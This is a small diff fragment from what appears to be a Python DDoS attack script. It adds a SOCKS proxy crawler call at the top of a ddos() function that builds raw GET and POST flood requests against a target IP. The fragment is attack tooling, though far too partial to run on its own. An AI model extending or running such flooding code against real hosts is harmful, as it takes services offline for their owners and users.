@@ -2435,6 +2435,7 @@ def Headers(method):
     return header
 
 def ddos():
+    socksCrawler()
     get_host = "GET HTTP/1.1\r\nHost: " + ip + "\r\n"
     post_host = "POST HTTP/1.1\r\nHost: " + ip + "\r\n"
     get_data = "GET https://check-host.net//1.1\r\nHost: " + ip + "\r\n"
